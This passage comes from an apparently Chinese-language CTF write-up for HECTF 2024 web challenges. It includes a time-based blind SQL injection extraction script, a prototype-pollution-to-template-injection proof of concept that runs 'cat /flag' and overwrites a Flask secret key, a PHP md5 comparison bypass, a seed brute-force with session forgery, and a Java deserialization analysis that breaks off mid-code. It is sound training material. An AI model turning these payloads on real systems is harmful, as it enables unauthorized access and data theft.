alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(database_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/limit/**/3,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                name += j</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前数据库的表有2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/count(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前数据库的表有&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为测出来有两个表，所以需要查两次</span></span><br><span class="line"><span class="comment"># 当前数据库表名长度为36</span></span><br><span class="line"><span class="comment"># 当前数据库表名长度为8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/length(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;当前数据库表名长度为&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为存在两张表，所以得查两次</span></span><br><span class="line"><span class="comment"># flag_is_in_flag1shere_loockhere_flag</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">37</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/Or/**/if((select/**/substr(table_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(j,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库的数据个数为1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_count</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/count(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库的数据个数为&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag的长度为32</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_name_len</span>():</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/length(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">        data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag的长度为&quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hectf&#123;fl4g_1s_h5r5_n1ce_try_4_u&#125;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag_get</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">34</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> alpha:</span><br><span class="line">            payload = <span class="string">&quot;g01den&#x27;/**/or/**/if((select/**/substr(flag,&#123;&#125;,1)/**/from/**/flag1shere.lookhere)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">            data = &#123;<span class="string">&quot;name&quot;</span>: payload&#125;</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            <span class="keyword">if</span> istime(data) == <span class="string">&quot;timeout&quot;</span>:</span><br><span class="line">                flag += j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># db_name_len()</span></span><br><span class="line"><span class="comment"># db_name()</span></span><br><span class="line"><span class="comment"># db_name_count()</span></span><br><span class="line"><span class="comment"># db_name_len_list()</span></span><br><span class="line"><span class="comment"># db_name_list()</span></span><br><span class="line"><span class="comment"># tb_count()</span></span><br><span class="line"><span class="comment"># tb_name_len()</span></span><br><span class="line"><span class="comment"># tb_name()</span></span><br><span class="line"><span class="comment"># flag_count()</span></span><br><span class="line"><span class="comment"># flag_name_len()</span></span><br><span class="line"><span class="comment"># flag_get()</span></span><br></pre></td></tr></table></figure><p>​直接跑最后一个函数就可以得到 flag，但是时间会很长，其他的是为了让这个题有始有终，尽可能获得更多的数据。</p><h3 id="你一个人专属的进货网站"><a class="markdownIt-Anchor" href="#你一个人专属的进货网站">#</a> 你一个人专属的进货网站：</h3><p>​看到 <code>#pip install -v pydash==5.1.2</code>  知是原型链污染。</p><p>​admin 路由中存在 ssti，想进去需要伪造 session。setUserInfo 路由存在原型链污染，抓包改参数，先污染 key，之后污染 WAF 文件里的 blacklist，之后污染 user 对象里的 username 或者 setUserInfo 改名进行 ssti。</p><p>​这里贴一下大佬的 poc：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> url = <span class="string">&#x27;8.153.107.251:32109&#x27;</span></span><br><span class="line"> login_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/login&#x27;</span></span><br><span class="line"> setUserInfo_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/setUserInfo&#x27;</span></span><br><span class="line"> admin_url = <span class="string">f&#x27;http://<span class="subst">&#123;url&#125;</span>/admin&#x27;</span></span><br><span class="line"> username = <span class="string">&quot;[[g.pop.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()]]&quot;</span></span><br><span class="line"> password = <span class="string">&quot;lbz&quot;</span></span><br><span class="line"> login_data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line"> &#125;</span><br><span class="line"> response0 = requests.post(login_url, data=login_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.config.SECRET_KEY&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;123&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response1 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_start_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;[[&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response2 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.app.jinja_env.variable_end_string&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;]]&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response3 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> setUserInfo_data = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&quot;.__init__.__globals__.WAF.blacklist&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;value&#x27;</span>: <span class="string">&quot;%&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line">response4 = requests.post(setUserInfo_url, data=setUserInfo_data)</span><br><span class="line"> session = <span class="built_in">input</span>(<span class="string">&quot;Enter the session cookie: &quot;</span>)</span><br><span class="line"> cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span>: session</span><br><span class="line"> &#125;</span><br><span class="line"> response5 = requests.get(admin_url, cookies=cookies)</span><br><span class="line"> <span class="built_in">print</span>(response5.text)</span><br></pre></td></tr></table></figure><p>​session 伪造可以用 flask_session_cookie_manager 。</p><h3 id="ezweb"><a class="markdownIt-Anchor" href="#ezweb">#</a> ezweb</h3><p>​查看源码，得到 base64 解密数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="string">&#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;</span>) &#123; <span class="comment">//xxxxx2024</span></span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​传入这个绕过前两层</p><blockquote><p>?a[]=a&amp;b[]=b&amp;c[]=c&amp;d[]=d</p></blockquote><p>​之后的 guess 撞库获得 hECTf2024。得到 secret.php 文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//mt_srand(rand(1e5,1e7));</span></span><br><span class="line"><span class="comment">//$key = rand();</span></span><br><span class="line"><span class="comment">//file_put_contents(*,$key);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="number">0</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>,<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​看出来加密算法，AES-256-CBC，key 为随机生成的，种子也是随机生成的，得爆破，贴个大佬的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">100000</span>; <span class="variable">$i</span> &lt; <span class="number">10000000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">rand</span>();</span><br><span class="line">    <span class="variable">$session</span> = <span class="string">&quot;ja59o5qBBFlXzx7hHeauqrsXPoilxIhW%2F5Aq9CFdqF1kGFHBVjb7TvMlEfZwG5eBukjNbEQSV9VKTLuZevUwJuX2LZ7qc9lu22V%2B368YSXWwoHTWlM9XFUY9jWip3pUo&quot;</span>;</span><br><span class="line">    <span class="variable">$session</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">session_decrypt</span>(<span class="variable">$session</span>, <span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">false</span> <span class="keyword">and</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/guest|admin/i&quot;</span>, <span class="variable">$result</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">解密成功！解密后的数据</span></span><br><span class="line"><span class="string">&quot;</span> . (<span class="variable">$result</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Key:&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;srand:&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_decrypt</span>(<span class="params"><span class="variable">$session</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$session</span>);</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="variable">$enc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$enc</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>解密成功！解密后的数据<br> O:4:“User”:2:{s:8:“username”;s:5:“guest”;s:4:“role”;s:5:“guest”;}<br>Key:1728818262<br>srand:8168720</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">session_encrypt</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class="number">1728818262</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">session_encrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$method</span> = <span class="string">&#x27;AES-256-CBC&#x27;</span>;</span><br><span class="line">    <span class="variable">$iv_size</span> = <span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$method</span>);</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="variable">$iv_size</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encrypted</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="variable">$method</span>, <span class="variable">$key</span>, <span class="number">1</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$encrypted</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$encoded</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span> . <span class="variable">$encrypted</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encoded</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#DWuzth9WfI2ufPUB5nI99CQuFk4nBqn8g3cvtJfSb5E4wnC+d4sICqt3hONji9RbclgNtgPZLkKQPSvO6e6INHudhIc9ofgj4GYs/6mZWx+jLaaqV+5jQLCvvGtfLLD2</span></span><br></pre></td></tr></table></figure><p>​之后得到了 flag。</p><h3 id="ezjava"><a class="markdownIt-Anchor" href="#ezjava">#</a> ezjava：</h3><p>​不会 java，所以先抄一遍学长的 wp，之后再学习下  (╥_╥)</p><p>​通过附件中的 jar 包可以看出有，CC3.2.1、vaadin 依赖，推测是用 vaadin 的链子。</p><p>​通过反编译 jar 包的 IndexController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.easyjava.Controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.MyObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> com.example.easyjava.challenge.normal;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/Controller/IndexController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String string;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">main</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/file&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam</span> String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(data);</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span> || data.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        string = data;</span><br><span class="line">        deserialize(string);      <span class="comment">//这里存在反序列化</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">deserialize</span><span class="params">(String base64data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(decode);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">new</span> <span class="title class_">normal</span>(payload).blacklist(payload)) &#123;<span class="comment">//这里有黑名单</span></span><br><span class="line">                <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data.toString().replace(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">                ois.readObject();</span><br><span class="line">                ois.close();</span><br><span class="line">                <span class="keyword">return</span> ois;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;redirect:/error.html&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​可以看到 /file 路由，直接把传入的 string 字符串反序列化，并且 string 是我们可控的，但是下面有黑名单</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 